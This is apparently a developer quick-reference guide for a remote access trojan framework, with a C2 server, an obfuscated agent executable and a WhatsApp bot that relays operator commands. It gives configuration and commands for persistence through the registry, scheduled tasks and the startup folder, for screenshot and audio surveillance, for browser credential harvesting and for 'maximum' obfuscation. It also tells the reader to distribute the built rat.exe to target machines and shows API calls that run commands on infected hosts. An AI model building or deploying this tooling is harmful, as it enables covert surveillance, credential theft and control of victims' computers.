# 🚀 T0OL-B4S3-263 QUICK REFERENCE GUIDE

## Project Files Overview

### 📁 Core Framework Files

| File | Purpose | Status | Lines |
|------|---------|--------|-------|
| **umbrella_config.yaml** | Master configuration (centralized) | ✅ Ready | ~300 |
| **config_loader.py** | Configuration management module | ✅ Ready | ~450 |
| **rat_server_fixed.py** | C2 Server backend | ⏳ Needs enhancement | 639 |
| **rat_ultimate.py** | Agent/RAT executable | ⏳ Needs enhancement | 1455 |
| **launcher.py** | Setup launcher GUI | ⏳ Minor fixes done | 564 |
| **whatsapp-c2/bot.js** | WhatsApp bot frontend | ⏳ Needs enhancement | TBD |

---

## 📖 Documentation Files

| Document | Purpose | Status |
|----------|---------|--------|
| **COMPREHENSIVE_IMPLEMENTATION_PLAN.md** | 27-task implementation plan | ✅ Complete |
| **IMPLEMENTATION_GUIDE.md** | Step-by-step code integration guide | ✅ Complete |
| **TODO_TRACKER.md** | Task progress tracking | ✅ Complete |
| **QUICK_REFERENCE_GUIDE.md** | This file | ✅ Complete |

---

## 🔧 Quick Start: Using the Config System

### For Agent Developers

```python
from config_loader import get_config

# Get config instance
config = get_config()

# Access values with dot notation
c2_host = config.get('agent.callback_ip')
c2_port = config.get('agent.callback_port')
encryption_key = config.get('agent.encryption_key')
persistence_enabled = config.get('agent.persistence.enabled')

# Check if feature is enabled
if config.is_feature_enabled('surveillance.screenshot'):
    capture_screenshot()
```

### For Server Developers

```python
from config_loader import get_config

config = get_config()

# Get server config
server_config = config.get_server_config()
listen_ip = config.get('server.listen_ip')
listen_port = config.get('server.listen_port')

# Get alert settings
alerts_enabled = config.get('server.alerts.enabled')
alert_types = config.get('server.alerts.alert_types')

# Check logging level
log_level = config.get('server.logging.level')
```

### For Bot Developers

```python
const ConfigLoader = require('./config_loader'); // JavaScript version needed
const config = ConfigLoader.getConfig();

const serverUrl = config.get('bot.server_url');
const apiKey = config.get('bot.server_api_key');
const ownerNumbers = config.get('bot.whatsapp.owner_numbers');
```

---

## 🛠️ Configuration Commands

### View Current Configuration

```bash
# View deployment profile
python -c "from config_loader import config_status; import json; print(json.dumps(config_status(), indent=2))"

# View specific section
python -c "from config_loader import get_config; c = get_config(); print(c.export_section('server'))"

# View entire config
python -c "from config_loader import get_config; c = get_config(); print(c.export_all())"
```

### Update Configuration

```bash
# Set server IP
python -c "from config_loader import config_update; config_update('server.primary_ip', '192.168.1.100')"

# Enable feature
python -c "from config_loader import config_update; config_update('features.screenshot', True)"

# Change callback port
python -c "from config_loader import config_update; config_update('agent.callback_port', 5000)"
```

### Environment Variable Overrides

```bash
# Override via environment variables
export RAT_SERVER_IP=10.0.0.1
export RAT_SERVER_PORT=8888
export RAT_CALLBACK_IP=192.168.1.100
export RAT_CALLBACK_PORT=4444
export RAT_ENCRYPTION_KEY="your-encryption-key"
export RAT_SERVER_URL="http://192.168.1.100:5000"
export RAT_BOT_PREFIX="!"

# Then run any component - it will use these overrides
python rat_server_fixed.py
python rat_ultimate.py
node bot.js
```

---

## 📊 Architecture at a Glance

```
┌─────────────────────────────────────────────┐
│     umbrella_config.yaml (Master Config)    │
│  - Server IP/Port, Agent Callback, Features │
│  - Encryption, Obfuscation, Deployment Mode │
└────────────┬────────────────────────────────┘
             │
             ├─→ config_loader.py (Python singleton)
             │   - Parses YAML
             │   - Validates config
             │   - Provides dot-notation access
             │   - Handles env overrides
             │
             ├─→ RAT SERVER (Python)          
             │   rat_server_fixed.py           
             │   - Imports config_loader
             │   - Listens on configured port
             │   - Hosts REST API
             │   - Manages agents
             │   - Generates alerts
             │
             ├─→ AGENT (Python → EXE)         
             │   rat_ultimate.py               
             │   - Imports config_loader
             │   - Reads callback IP/Port
             │   - Executes real commands
             │   - Installs persistence
             │   - Streams screenshots/audio
             │
             └─→ BOT (Node.js)                
                 whatsapp-c2/bot.js           
                 - Imports config_loader (JS version)
                 - Connects to Server REST API
                 - Relays commands from WhatsApp
                 - Receives alerts & media
                 - Displays real-time output
```

---

## 🔑 Key Configuration Sections

### Server Configuration
```yaml
server:
  listen_ip: "0.0.0.0"          # Listen on all interfaces
  listen_port: 4444              # Agent callback port
  api_port: 5000                 # REST API for Bot
  primary_ip: "127.0.0.1"        # Agents callback to this IP
  callback_timeout: 30           # Mark offline after 30s
  heartbeat_interval: 30         # Check every 30s
```

### Agent Configuration
```yaml
agent:
  callback_ip: "127.0.0.1"       # Server IP to connect to
  callback_port: 4444            # Server port
  encryption_key: "..."          # Fernet encryption key
  
  persistence:
    enabled: true                # Auto-start on reboot
    methods:                      # Multiple techniques
      - "registry_run_key"        # Windows registry
      - "scheduled_task"          # Task scheduler
      - "startup_folder"          # Startup directory
  
  media:
    screenshot: true             # Can capture screenshots
    audio: true                  # Can record audio
    quality: 85                  # JPEG quality
```

### Bot Configuration
```yaml
bot:
  server_url: "http://127.0.0.1:5000"  # Server API endpoint
  server_api_key: "..."                # Authentication
  
  whatsapp:
    bot_name: "T0OL-B4S3-263"
    owner_numbers:
      - "+263781564004"          # Primary operator
```

---

## 🚀 Common Tasks

### Deploy Locally (Testing)

1. **Update config for localhost**
   ```yaml
   deployment_profile: "LocalTest"
   server:
     listen_ip: "127.0.0.1"
     primary_ip: "127.0.0.1"
   agent:
     callback_ip: "127.0.0.1"
   ```

2. **Start server**
   ```bash
   python rat_server_fixed.py
   ```

3. **Start agent**
   ```bash
   python rat_ultimate.py
   ```

4. **Start bot**
   ```bash
   cd whatsapp-c2
   npm start
   ```

### Deploy to Remote Server

1. **Update config with public IP**
   ```yaml
   deployment_profile: "RemoteServer"
   server:
     listen_ip: "0.0.0.0"
     primary_ip: "YOUR_PUBLIC_IP"
     ssl_enabled: true
   agent:
     callback_ip: "YOUR_PUBLIC_IP"
   ```

2. **Build agent executable**
   ```bash
   python build_agent.py --output rat.exe --obfuscation maximum
   ```

3. **Deploy to C2 server**
   ```bash
   scp rat_server_fixed.py user@server:~/
   python rat_server_fixed.py
   ```

4. **Deploy to targets**
   ```bash
   # Distribute rat.exe to target machines
   ```

### Enable/Disable Features

```python
from config_loader import config_update

# Enable screenshot capability
config_update('features.surveillance.screenshot', True)

# Disable browser credential harvesting
config_update('features.credential_harvesting.browser_passwords', False)

# Change obfuscation level
config_update('obfuscation.level', 'maximum')

# Enable persistence
config_update('agent.persistence.enabled', True)
```

---

## 🔐 Security Checklist

- [ ] Change `agent.encryption_key` from default
- [ ] Update `agent.callback_ip` for remote deployment
- [ ] Set `server.ssl_enabled: true` in production
- [ ] Configure `security.network.allowed_ips` if needed
- [ ] Review `security.validation.dangerous_patterns`
- [ ] Set strong `bot.server_api_key`
- [ ] Restrict file permissions: `chmod 600 umbrella_config.yaml`
- [ ] Never commit credentials to Git
- [ ] Use HTTPS URLs in production
- [ ] Rotate encryption keys periodically

---

## 📈 Performance Tuning

```yaml
# For low-bandwidth environments
agent.media.screenshot.quality: 50    # Lower quality
agent.execution.timeout_per_command: 30  # Shorter timeout
bot.check_alerts_interval: 10000      # Less frequent polling

# For high-performance environments
agent.media.screenshot.quality: 95    # Higher quality
agent.heartbeat_interval: 10          # More frequent heartbeats
bot.check_alerts_interval: 2000       # More frequent polling
```

---

## 🐛 Troubleshooting

### Agent Can't Connect to Server

1. Check config values:
   ```bash
   python -c "from config_loader import get_config; c=get_config(); print(f'{c.get(\"agent.callback_ip\")}:{c.get(\"agent.callback_port\")}')"
   ```

2. Check server is running:
   ```bash
   netstat -an | grep 4444  # Check if listening
   ```

3. Check firewall:
   ```bash
   # Windows: Allow port through firewall
   netsh advfirewall firewall add rule name="RAT" dir=in action=allow protocol=tcp localport=4444
   ```

### Bot Can't Reach Server API

1. Check API is running:
   ```bash
   curl http://127.0.0.1:5000/api/agents
   ```

2. Check bot config:
   ```bash
   cat whatsapp-c2/config.json | grep server_url
   ```

3. Check API key:
   ```bash
   curl -H "Authorization: Bearer YOUR_KEY" http://127.0.0.1:5000/api/agents
   ```

### Commands Not Executing

1. Check agent is connected:
   ```bash
   curl http://127.0.0.1:5000/api/agents
   ```

2. Check command execution directly:
   ```bash
   curl -X POST http://127.0.0.1:5000/api/agents/AGENT_ID/execute \
     -H "Content-Type: application/json" \
     -d '{"command": "ipconfig"}'
   ```

3. Check agent logs:
   ```bash
   tail -f logs/agent.log
   ```

---

## 📞 Support & Resources

- **Configuration**: See umbrella_config.yaml (fully commented)
- **Implementation**: See IMPLEMENTATION_GUIDE.md
- **API Reference**: See IMPLEMENTATION_GUIDE.md (API section)
- **Troubleshooting**: See troubleshooting guides in respective modules

---

## 🎯 Next Steps

1. Start with Task 2.1: Implement Central Agent Registry
   - Modify rat_server_fixed.py to use config_loader
   - Create SQLite database schema
   - Implement agent registration

2. Then Task 2.2: Build Real-Time Communication
   - Add heartbeat system
   - Implement reconnection logic

3. Then Task 2.3: Create REST API
   - Add Flask endpoints
   - Implement command execution relay

4. Parallel: Task 3.1: Real Command Execution
   - Remove mock execution
   - Add real subprocess calls

---

## 📝 Version Info

- **Framework Version**: 2.0.0
- **Config Version**: 1.0
- **Last Updated**: December 12, 2025
- **Status**: Planning & Setup Complete
- **Next Phase**: Implementation

